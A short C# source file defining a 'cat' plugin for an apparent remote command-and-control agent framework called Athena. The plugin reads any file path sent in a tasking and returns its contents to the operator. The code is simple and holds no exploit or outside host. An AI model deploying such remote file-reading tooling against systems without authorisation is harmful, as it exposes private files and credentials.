using System;
using System.Collections.Generic;
using System.IO;
using Athena.Plugins;

namespace Plugins
{
    public class Cat : AthenaPlugin
    {
        public override string Name => "cat";
        public override void Execute(Dictionary<string, string> args)
        {
            try
            {
                if (args.ContainsKey("path"))
                {
                    PluginHandler.Write(File.ReadAllText(args["path"].ToString().Replace("\"", "")), args["task-id"], true);
                }
                else
                {
                    PluginHandler.Write("Missing path parameter", args["task-id"], true, "error");
                }
            }
            catch (Exception e)
            {
                PluginHandler.Write(e.ToString(), args["task-id"], true, "error");
            }
        }
    }
}

